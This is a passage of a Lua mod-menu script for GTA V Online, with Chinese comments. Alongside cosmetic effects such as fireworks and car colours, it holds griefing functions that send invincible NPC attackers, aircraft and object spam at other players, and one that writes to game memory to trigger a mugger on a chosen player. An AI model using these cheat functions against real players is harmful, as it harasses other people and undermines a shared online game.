        VEHICLE.SET_VEHICLE_SIREN(vehicle, true)
        VEHICLE.SET_VEHICLE_ENGINE_ON(vehicle, true, true, true)
        for seat = -1, -1 do
            local cop = entities.create_ped(2, pedHash, outCoords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            addBlipForEntity(vehicle, 724, 17)
            PED.SET_PED_INTO_VEHICLE(cop, vehicle, seat)
            TASK.TASK_COMBAT_PED(cop, targetPed, 0, 16)
            PED.SET_PED_KEEP_TASK(cop, true)
            VEHICLE.SET_VEHICLE_COLOURS(vehicle, 32, 32)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(vehicle, true)
            VEHICLE.SET_VEHICLE_DOORS_LOCKED(vehicle,-1, 3)
            PED.SET_PED_COMBAT_ATTRIBUTES(cop, 46, true)
            PED.SET_PED_COMBAT_ATTRIBUTES(cop, 3, false)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(cop, true)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "Betty 32")
            VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vehicle, 50)
            ENTITY.SET_ENTITY_INVINCIBLE(cop, true)
            ENTITY.SET_ENTITY_INVINCIBLE(vehicle, true)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT_INDEX(vehicle, 0)
            PED.SET_PED_NEVER_LEAVES_GROUP(cop, true)
            TASK.TASK_VEHICLE_MISSION_PED_TARGET(cop, vehicle, targetPed, 6, 100, 0, 0, 0, true)
        end
        for seat2 = 0, 0 do --2nd invisible trevor to insult the player due to gta being gta - and the fact that an npc cant have 2 tasks AFAIK
            local trev = entities.create_ped(2, pedHash, outCoords, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
            PED.SET_PED_INTO_VEHICLE(trev, vehicle, seat2)
            PED.SET_PED_COMBAT_ATTRIBUTES(trev, 3, false)
            PED.SET_PED_COMBAT_ATTRIBUTES(trev, 46, true)
            ENTITY.SET_ENTITY_VISIBLE(trev, false, 0)
            TASK.TASK_COMBAT_PED(trev, targetPed, 0, 16)
            ENTITY.SET_ENTITY_INVINCIBLE(trev, true)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(trev, true)
        end
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedHash)
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(vehicleHash)
end




----牛车
function ride_cow()
    local player_heading = ENTITY.GET_ENTITY_HEADING(PLAYER.PLAYER_PED_ID())
    local player_coords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
    local veh = create_vehicle(1641462412, player_coords.x, player_coords.y, player_coords.z, player_heading)
    ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
    ENTITY.SET_ENTITY_INVINCIBLE(veh, true)
    local rider = create_ped(29, 4244282910, player_coords.x, player_coords.y, player_coords.z, player_heading)
    PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), veh, -1)
    local bone = PED.GET_PED_BONE_INDEX(rider, 0x796e)
    ENTITY.ATTACH_ENTITY_TO_ENTITY(rider, veh, bone, 0, -1, 0.5, 0, 0, 0, true, false, false, false, 1, true, 0)
    PED.SET_PED_CONFIG_FLAG(rider, 208, true)
    PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(rider, true)
    ENTITY.SET_ENTITY_INVINCIBLE(rider, true)
end


----珍珠烟花
function Pearl_fireworks()
    local animlib = 'anim@mp_fireworks'
    local anim_name = 'place_firework_3_box'
    request_anim_dict(animlib)
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0.0, 0.52, 0.0)
    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)
    TASK.TASK_PLAY_ANIM(PLAYER.PLAYER_PED_ID(), animlib, anim_name, -1, -8.0, 3000, 0, 0, false, false, false)
    util.yield(1500)
    local box = create_object(-879052345, pos.x, pos.y, pos.z)
    local box_pos = ENTITY.GET_ENTITY_COORDS(box)
    OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(box)
    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
    ENTITY.FREEZE_ENTITY_POSITION(box, true)
    util.yield(5000)

    local effect = "scr_indep_fireworks"
    local effect_name = "scr_indep_firework_fountain"
    request_ptfx_asset(effect)
    --第一阶段
    for i = 1, 20 do
        local c = math.ceil(i / 5) / 100 --4级(逐步修改烟花尺寸)
        GRAPHICS.USE_PARTICLE_FX_ASSET(effect)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, box, 0, 0, 0.2, 0, 180, 0, c, true, true, true)
        GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(226 / 255, 17 / 255, 12 / 255)
        util.yield(100)
    end
    --第二阶段
    local end_time = os.time() + 10
    while end_time >= os.time() do
        GRAPHICS.USE_PARTICLE_FX_ASSET(effect)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, box, 0, 0, 0.2, 0, 180, 0, 0.08, true, true, true)
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, box, 0, 0, 0.2, 0, 180, 0, 0.08, true, true, true)
        GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(math.random(0, 255) / 255, math.random(0, 255) / 255, math.random(0, 255) / 255)
        util.yield(100)
    end
    util.yield(8000)
    delete_entity(box)
end

--烟花桶
local placed_firework_boxes = {}
function anfangyanhua()
    local animlib = 'anim@mp_fireworks'
    local anim_name = 'place_firework_3_box'
    request_anim_dict(animlib)
    local pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), 0.0, 0.52, 0.0)
    local ped = PLAYER.PLAYER_PED_ID()
    ENTITY.FREEZE_ENTITY_POSITION(ped, true)
    TASK.TASK_PLAY_ANIM(ped, animlib, anim_name, -1, -8.0, 3000, 0, 0, false, false, false)
    util.yield(1500)
    local firework_box = entities.create_object(util.joaat('ind_prop_firework_03'), pos, true, false, false)
    local firework_box_pos = ENTITY.GET_ENTITY_COORDS(firework_box)
    OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(firework_box)
    ENTITY.FREEZE_ENTITY_POSITION(ped, false)
    util.yield(1000)
    ENTITY.FREEZE_ENTITY_POSITION(firework_box, true)
    placed_firework_boxes[#placed_firework_boxes + 1] = firework_box
end
function yanhuafashe()
    if #placed_firework_boxes == 0 then 
        util.toast("请先安放烟花!")
        return 
    end
    local ptfx_asset = "scr_indep_fireworks"
    local effect_name = "scr_indep_firework_trailburst"
    request_ptfx_asset(ptfx_asset)
    util.toast("烟花发射wow")
    for i = 1, 50 do
        for k, box in pairs(placed_firework_boxes) do 
            GRAPHICS.USE_PARTICLE_FX_ASSET(ptfx_asset)
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_ON_ENTITY(effect_name, box, 0, 0, 0, 0, 180, 0, 1, true, true, true)
            GRAPHICS.SET_PARTICLE_FX_NON_LOOPED_COLOUR(math.random(0, 255) / 255, math.random(0, 255) / 255, math.random(0, 255) / 255)
            util.yield(100)
        end
    end
    for k, box in pairs(placed_firework_boxes) do 
        delete_entity(box)
    end
    placed_firework_boxes = {}
end


----------女武神导弹
function nvwushen(toggle)
gUsingValkRocket = toggle
    if gUsingValkRocket then
        local rocket = 0
        local cam = 0
        local blip = 0
        local init = false
        local draw_rect = function(x, y, z, w)
            GRAPHICS.DRAW_RECT(x, y, z, w, 255, 255, 255, 255, false)
        end
        while gUsingValkRocket do
            util.yield_once()
            if PED.IS_PED_SHOOTING(PLAYER.PLAYER_PED_ID()) and not init then
                init = true
                timer.reset()
            elseif init then
                if not ENTITY.DOES_ENTITY_EXIST(rocket) then
                    local offset = get_offset_from_camera(10)
                    rocket = entities.create_object(util.joaat("w_lr_rpg_rocket"), offset)
                    ENTITY.SET_ENTITY_INVINCIBLE(rocket, true)
                    ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(rocket, true, 1)
                    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.OBJ_TO_NET(rocket), true)
                    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(NETWORK.OBJ_TO_NET(rocket), false)
                    ENTITY.SET_ENTITY_RECORDS_COLLISIONS(rocket, true)
                    ENTITY.SET_ENTITY_HAS_GRAVITY(rocket, false)
                    CAM.DESTROY_ALL_CAMS(true)
                    cam = CAM.CREATE_CAM("DEFAULT_SCRIPTED_CAMERA", true)
                    CAM.SET_CAM_NEAR_CLIP(cam, 0.01)
                    CAM.SET_CAM_NEAR_DOF(cam, 0.01)
                    GRAPHICS.CLEAR_TIMECYCLE_MODIFIER()
                    GRAPHICS.SET_TIMECYCLE_MODIFIER("CAMERA_secuirity")
                    CAM1.HARD_ATTACH_CAM_TO_ENTITY(cam, rocket, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true)
                    CAM.SET_CAM_ACTIVE(cam, true)
                    CAM.RENDER_SCRIPT_CAMS(true, false, 0, true, true, 0)
                    PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), true)
                    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)
                else
                    local rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
                    local coords = ENTITY.GET_ENTITY_COORDS(rocket, false)
                    local force = rot:toDir()
                    force:mul(40.0)
                    ENTITY.SET_ENTITY_ROTATION(rocket, rot.x, rot.y, rot.z, 0, true)
                    STREAMING.SET_FOCUS_POS_AND_VEL(coords.x, coords.y, coords.z, rot.x, rot.y, rot.z)
                    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(rocket, 1, force.x, force.y, force.z, false, false, false, false)
                    HUD.HIDE_HUD_AND_RADAR_THIS_FRAME()
                    PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), true)
                    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), true)
                    HUD1.HUD_SUPPRESS_WEAPON_WHEEL_RESULTS_THIS_FRAME()
                    draw_rect(0.5, 0.5 - 0.025, 0.050, 0.002)
                    draw_rect(0.5, 0.5 + 0.025, 0.050, 0.002)
                    draw_rect(0.5 - 0.025, 0.5, 0.002, 0.052)
                    draw_rect(0.5 + 0.025, 0.5, 0.002, 0.052)
                    draw_rect(0.5 + 0.050, 0.5, 0.050, 0.002)
                    draw_rect(0.5 - 0.050, 0.5, 0.050, 0.002)
                    draw_rect(0.5, 0.500 + 0.05, 0.002, 0.05)
                    draw_rect(0.5, 0.500 - 0.05, 0.002, 0.05)
                    local maxTime = 7000 -- `ms`
                    local length = 0.5 - 0.5 * (timer.elapsed() / maxTime) -- timer length
                    local perc = length / 0.5
                    local color = get_blended_colour(perc) -- timer color
                    GRAPHICS.DRAW_RECT(0.25, 0.5, 0.03, 0.5, 255, 255, 255, 120, false)
                    GRAPHICS.DRAW_RECT(0.25, 0.75 - length / 2, 0.03, length, color.r, color.g, color.b, color.a, false)
                    if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(rocket) or length <= 0 then
                        local impactCoord = ENTITY.GET_ENTITY_COORDS(rocket, false)
                        FIRE.ADD_EXPLOSION(impactCoord.x, impactCoord.y, impactCoord.z, 32, 1.0, true, false, 0.4, false)
                        delete_entity(rocket)
                        CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, false, 0)
                        GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
                        STREAMING.CLEAR_FOCUS()
                        CAM.DESTROY_CAM(cam, true)
                        PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), false)
                        ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
                        rocket = 0
                        init = false
                    end
                end
            end
        end
        if rocket and ENTITY.DOES_ENTITY_EXIST(rocket) then
            local impactCoord = ENTITY.GET_ENTITY_COORDS(rocket, false)
            FIRE.ADD_EXPLOSION(impactCoord.x, impactCoord.y, impactCoord.z, 32, 1.0, true, false, 0.4, false)
            delete_entity(rocket)
            STREAMING.CLEAR_FOCUS()
            CAM.RENDER_SCRIPT_CAMS(false, false, 0, true, false, 0)
            CAM.DESTROY_CAM(cam, true)
            GRAPHICS.SET_TIMECYCLE_MODIFIER("DEFAULT")
            ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(), false)
            PLAYER.DISABLE_PLAYER_FIRING(PLAYER.PLAYER_PED_ID(), false)
            if HUD.DOES_BLIP_EXIST(blip) then util.remove_blip(blip) end
            HUD.UNLOCK_MINIMAP_ANGLE()
            HUD.UNLOCK_MINIMAP_POSITION()
        end
    end
end

-------载具变色
function requestweapon(...)
	local arg = {...}
	for _, model in ipairs(arg) do
		request_weapon_asset(model)
	end
end
function RGBNeonKit(pedm)
    local vmod = PED.GET_VEHICLE_PED_IS_IN(pedm, false)
    for i = 0, 3 do
        VEHICLE.SET_VEHICLE_NEON_ENABLED(vmod, i, true)
    end
end
local rgb_cus = 100
function colorspeed(c)
    rgb_cus = 10000/c
end
function zjbs()
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID(), true) ~= 0 then
        local vmod = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), true)
        RGBNeonKit(PLAYER.PLAYER_PED_ID())
        local red = math.random(0, 255)
        local green = math.random(0, 255)
        local blue = math.random(0, 255)
        VEHICLE.SET_VEHICLE_NEON_COLOUR(vmod, red, green, blue)
        VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vmod, red, green, blue)
        VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vmod, red, green, blue)
        util.yield(rgb_cus)
       end
    end
local qzdrgb_cus = 100
function qzdcolorspeed(c)
    qzdrgb_cus = 10000/c
end
function qzd()
    local color = {
            {64, 1},
            {73, 2},
            {51, 3}, 
            {92, 4}, 
            {89, 5}, 
            {88, 6}, 
            {38, 7}, 
            {39 , 8}, 
            {137, 9}, 
            {135, 10}, 
            {145, 11},
            {142, 12} 
        }
    if PED.IS_PED_IN_ANY_VEHICLE(PLAYER.PLAYER_PED_ID()) ~= 0 then
        local vmod = PED.GET_VEHICLE_PED_IS_IN(PLAYER.PLAYER_PED_ID(), true)
        RGBNeonKit(PLAYER.PLAYER_PED_ID())
        local rcolor = math.random(1, 12)
        VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 22, true)
        VEHICLE.SET_VEHICLE_NEON_INDEX_COLOUR(vmod, color[rcolor][1])
        VEHICLE.SET_VEHICLE_COLOURS(vmod, color[rcolor][1], color[rcolor][1])
        VEHICLE.SET_VEHICLE_EXTRA_COLOURS(vmod, 0, color[rcolor][1])
        VEHICLE.SET_VEHICLE_EXTRA_COLOUR_5(vmod, color[rcolor][1])
        VEHICLE.SET_VEHICLE_XENON_LIGHT_COLOR_INDEX(vmod, color[rcolor][2])
        util.yield(qzdrgb_cus)
    end
end

----B-11攻击
local B11plane = {}
function B11_attack(pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), false)
    local drive_ped = {}
    if ENTITY.DOES_ENTITY_EXIST(B11plane[1]) then return end
    for i = 1, 30 do
        B11plane[i] = create_vehicle(1692272545, pos.x+math.random(-100, 100), pos.y+math.random(-100, 100), pos.z+200, math.random(0, 360))

        ENTITY.SET_ENTITY_INVINCIBLE(B11plane[i],true)
        ENTITY.SET_ENTITY_COLLISION(B11plane[i], false, true)

        local blip = HUD.ADD_BLIP_FOR_ENTITY(B11plane[i])
        HUD.SET_BLIP_COLOUR(blip, 1)--设置颜色

        drive_ped[i] = PED.CREATE_RANDOM_PED_AS_DRIVER(B11plane[i], 1)
        VEHICLE.SET_VEHICLE_ENGINE_ON(drive_ped[i], true, true, 0)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(B11plane[i], 100 / 3.6)

        TASK.TASK_COMBAT_PED(drive_ped[i], PLAYER.GET_PLAYER_PED(pid), 0, 16)
    end
end


------轰炸区
function bomb_area()
    local hash = util.joaat("imp_prop_bomb_ball")
    request_model(hash)
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.PLAYER_PED_ID(), math.random(-200, 200), math.random(-200, 200), math.random(100, 200))
    local ball = entities.create_object(hash, c)
    ENTITY.FREEZE_ENTITY_POSITION(ball, false)
    ENTITY.SET_ENTITY_DYNAMIC(ball, true)
    ENTITY.APPLY_FORCE_TO_ENTITY(ball, 1, math.random(-300, 300), math.random(-300, 300), -300, 0, 0, 0, 0, true, false, true, true, true)
    
    util.create_tick_handler(function()
        if ENTITY.HAS_ENTITY_COLLIDED_WITH_ANYTHING(ball) then
            if ENTITY.DOES_ENTITY_EXIST(ball) then 
                local c = ENTITY.GET_ENTITY_COORDS(ball)
                FIRE.ADD_EXPLOSION(c.x, c.y, c.z, 17, 100.0, true, false, 0.0)
                delete_entity(ball)
            end
            return false
        end
    end)
    util.yield(200)
end



------------RGB
custom_rgb = true
rgb_thread = util.create_thread(function (thr)
    local r = 255
    local g = 0
    local b = 0
    rgb = {255, 0, 0}
    while true do
        if not custom_rgb then
            if r > 0 and g < 255 and b == 0 then
                r = r - 1
                g = g + 1
            elseif r == 0 and g > 0 and b < 255 then
                g = g - 1
                b = b + 1
            elseif r < 255 and b > 0 then
                r = r + 1
                b = b - 1
            end

            rgb[1] = r
            rgb[2] = g
            rgb[3] = b
        else
            rgb = {custom_r, custom_g, custom_b}
        end
        util.yield()
    end
end)
    


-----悲伤的耶稣
function dispatch_griefer_jesus(target)
    griefer_jesus = util.create_thread(function(thr)
        util.toast("悲伤耶稣派来了!")
        request_model(-835930287)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(target)
        coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z']
        local jesus = entities.create_ped(1, -835930287, coords, 90.0)
        ENTITY.SET_ENTITY_INVINCIBLE(jesus, true)
        PED.SET_PED_HEARING_RANGE(jesus, 9999)
	    PED.SET_PED_CONFIG_FLAG(jesus, 281, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(jesus, 5, true)
	    PED.SET_PED_COMBAT_ATTRIBUTES(jesus, 46, true)
        PED.SET_PED_CAN_RAGDOLL(jesus, false)
        WEAPON.GIVE_WEAPON_TO_PED(jesus, util.joaat("WEAPON_RAILGUN"), 9999, true, true)
        TASK.TASK_GO_TO_ENTITY(jesus, target_ped, -1, -1, 100.0, 0.0, 0)
    	TASK.TASK_COMBAT_PED(jesus, target_ped, 0, 16)
        PED.SET_PED_ACCURACY(jesus, 100.0)
        PED.SET_PED_COMBAT_ABILITY(jesus, 2)
        while true do
            local player_coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
            local jesus_coords = ENTITY.GET_ENTITY_COORDS(jesus, false)
            local dist =  Get_distance(player_coords, jesus_coords, false)
            if dist > 100 then
                local behind = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, -3.0, 0.0, 0.0)
                ENTITY.SET_ENTITY_COORDS(jesus, behind['x'], behind['y'], behind['z'], false, false, false, false)
            end
            -- if jesus disappears we can just make another lmao
            if not ENTITY.DOES_ENTITY_EXIST(jesus) then
                util.toast("耶稣显然不再存在。或许已被玩家清除。")
                util.stop_thread()
            end
            target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(target)
            if not players.exists(target) then
                util.toast("玩家目标已丢失。悲伤的耶稣线正在停止")
                util.stop_thread()
            else
                TASK.TASK_COMBAT_PED(jesus, target_ped, 0, 16)
            end
            util.yield()
        end
    end)
end

-----发送攻击者
function send_attacker(hash, pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local target_ped = PLAYER.GET_PLAYER_PED(pid)
    local pos = ENTITY.GET_ENTITY_COORDS(target_ped, false)
    local attacker = create_ped(28, hash, pos.x, pos.y, pos.z, math.random(0, 270))
    ENTITY.SET_ENTITY_INVINCIBLE(attacker, true)
    TASK.TASK_COMBAT_PED(attacker, target_ped, 0, 16)
    PED.SET_PED_ACCURACY(attacker, 100.0)
    PED.SET_PED_COMBAT_ABILITY(attacker, 2)
    PED.SET_PED_AS_ENEMY(attacker, true)
    PED.SET_PED_FLEE_ATTRIBUTES(attacker, 0, false)
    PED.SET_PED_COMBAT_ATTRIBUTES(attacker, 46, true)
end
function send_aircraft_attacker(vhash, phash, pid)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    local target_ped = PLAYER.GET_PLAYER_PED(pid)
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, 1.0, 0.0, 500.0)
    request_model(vhash)
    request_model(phash)
    coords.x = coords.x + 2
    coords.y = coords.y + 2
    local aircraft = entities.create_vehicle(vhash, coords, 0.0)
    VEHICLE.CONTROL_LANDING_GEAR(aircraft, 3)
    VEHICLE.SET_HELI_BLADES_FULL_SPEED(aircraft)
    VEHICLE.SET_VEHICLE_FORWARD_SPEED(aircraft, VEHICLE.GET_VEHICLE_ESTIMATED_MAX_SPEED(aircraft))
    ENTITY.SET_ENTITY_INVINCIBLE(aircraft, true)
    for i= -1, VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(vhash) - 2 do
        local ped = entities.create_ped(28, phash, coords, 30.0)
        TASK.TASK_PLANE_MISSION(ped, aircraft, 0, target_ped, 0, 0, 0, 6, 0.0, 0, 0.0, 50.0, 40.0)
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
        PED.SET_PED_INTO_VEHICLE(ped, aircraft, i)
        TASK.TASK_COMBAT_PED(ped, target_ped, 0, 16)
        PED.SET_PED_ACCURACY(ped, 100.0)
        PED.SET_PED_COMBAT_ABILITY(ped, 2)
    end
end



-----生成实体垃圾
function spam_entity_on_player(ped, hash)
    request_model(hash)
    for i=1, 30 do
        rand_coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, math.random(-1,1), math.random(-1,1), math.random(-1,1))
        rand_coords.x = rand_coords['x']
        rand_coords.y = rand_coords['y']
        rand_coords.z = rand_coords['z']
        obj = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, rand_coords['x'], rand_coords['y'], rand_coords['z'], true, false, false)
        grav_factor = 1.0
        ENTITY.SET_ENTITY_HAS_GRAVITY(obj, true)
        OBJECT.SET_ACTIVATE_OBJECT_PHYSICS_AS_SOON_AS_IT_IS_UNFROZEN(obj, true)
    end
end



----陨落的飞机
function start_angryplanes_thread()
    local v_hashes = {util.joaat('lazer'), util.joaat('jet'), util.joaat('cargoplane'), util.joaat('titan'), util.joaat('luxor'), util.joaat('seabreeze'), util.joaat('vestra'), util.joaat('volatol'), util.joaat('tula'), util.joaat('buzzard'), util.joaat('avenger')}
    local angry_planes_tar = PLAYER.PLAYER_PED_ID()
    local radius = 200
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(angry_planes_tar, math.random(-radius, radius), math.random(-radius, radius), math.random(600, 800))
    local pick = v_hashes[math.random(1, #v_hashes)]
    request_model(pick)
    local aircraft = entities.create_vehicle(pick, c, math.random(0, 270))
    set_entity_face_entity(aircraft, angry_planes_tar, true)
    VEHICLE.SET_VEHICLE_ENGINE_ON(aircraft, true, true, false)
    VEHICLE.SET_HELI_BLADES_FULL_SPEED(aircraft)
    VEHICLE.SET_VEHICLE_FORWARD_SPEED(aircraft, VEHICLE.GET_VEHICLE_ESTIMATED_MAX_SPEED(aircraft)+1000.0)
    VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(aircraft, true, true)
    util.yield(5000)
end

----墨西哥乐队
function dispatch_mariachi(target)
    if is_UltimateUser(target) then util.toast(BlockAttackUltimateUser) return end
    mariachi_thr = util.create_thread(function()
        local men = {}
        local player_ped
        local pos_offsets = {-1.0, 0.0, 1.0}
        local p_hash = -927261102
        local pos
        request_model(p_hash)
        player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(target)
        for i=1, 3 do
            local spawn_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, pos_offsets[i], 1.0, 0.0)
            local ped = entities.create_ped(1, p_hash, spawn_pos, 0.0)
            local flag = entities.create_object(util.joaat("prop_flag_mexico"), spawn_pos, 0)
            ENTITY.SET_ENTITY_HEADING(ped, ENTITY.GET_ENTITY_HEADING(player_ped)+180)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(flag, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true, 0)
            ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(ped, true, false)
            TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_MUSICIAN", 0, false)
            PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
            PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
            PED.SET_PED_CAN_RAGDOLL(ped, false)
            ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
            men[#men + 1] = ped
        end
    end)
end

------生成实体
function spawn_object_in_front_of_ped(ped, hash, ang, room, zoff, setonground)
    coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(ped, 0.0, room, zoff)
    request_model(hash)
    hdng = ENTITY.GET_ENTITY_HEADING(ped)
    local obj = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, coords['x'], coords['y'], coords['z'], true, false, false)
    ENTITY.SET_ENTITY_HEADING(obj, hdng+ang)
    if setonground then
        OBJECT.PLACE_OBJECT_ON_GROUND_PROPERLY(obj)
    end
    return obj
end

----禁用雾
function disable_fog(toggled)
    disablefog = toggled
    while disablefog do
        GRAPHICS.SET_TIMECYCLE_MODIFIER("int_no_fogalpha")
        util.yield()
    end
    GRAPHICS.SET_TIMECYCLE_MODIFIER("jewelry_entrance_INT_fog")
end

-----撒尿
function peeloop_player(pid,on)
    if on then
        if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
        local player_ped = PLAYER.GET_PLAYER_PED(pid)
        local bone_index = PED.GET_PED_BONE_INDEX(player_ped, 0x2e28)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        ptfx_id = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE("ent_amb_peeing", player_ped, 0, 0, 0, -90, 0, 0, bone_index, 2, false, false, false, 0, 0, 0, 0)
    else
        GRAPHICS.REMOVE_PARTICLE_FX(ptfx_id, true)
    end
end


-----自闭模式
function chickenmode(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        util.toast("开启自闭模式")
        menu.trigger_commands("desyncall on")
        menu.trigger_command(BlockIncSyncs)
        menu.trigger_command(BlockNetEvents)
        menu.trigger_commands("anticrashcamera on")
    else
        util.toast("关闭自闭模式")
        menu.trigger_commands("desyncall off")
        menu.trigger_command(UnblockIncSyncs)
        menu.trigger_command(UnblockNetEvents)
        menu.trigger_commands("anticrashcamera off")
    end
end

----拦截效果
function blockcrasheffect()
    local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID() , false)
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(PLAYER.PLAYER_PED_ID())
end
function blockfireeffect()
    local coords = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID() , false)
    FIRE.STOP_FIRE_IN_RANGE(coords.x, coords.y, coords.z, 100)
    FIRE.STOP_ENTITY_FIRE(PLAYER.PLAYER_PED_ID())
end

----派遣劫匪
function sendmugger_npc(pid)--gpbd_fm_1(全局名)  GangCall(MrRobot)
    if is_UltimateUser(pid) and pid ~= PLAYER.PLAYER_ID() then util.toast(BlockAttackUltimateUser) return end
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        util.toast("当前劫匪活动还未结束哦")
    else
        local bits_addr = memory.script_global(Global_Base.gpbd_fm_1 + (PLAYER.PLAYER_ID() * 883 + 1) + 140) --(https://github.com/root-cause/v-decompiled-scripts/blob/cbce27979edef67e0bfb1c2075072a4f644469cf/am_joyrider.c#L902)
        memory.write_int(bits_addr, SET_BIT(memory.read_int(bits_addr), 0))
        
        write_global.int(Global_Base.gpbd_fm_1 + (PLAYER.PLAYER_ID() * 883 + 1) + 141, pid)
        util.toast("劫匪已出动")
    end
end
----拦截劫匪
function block_mugger()
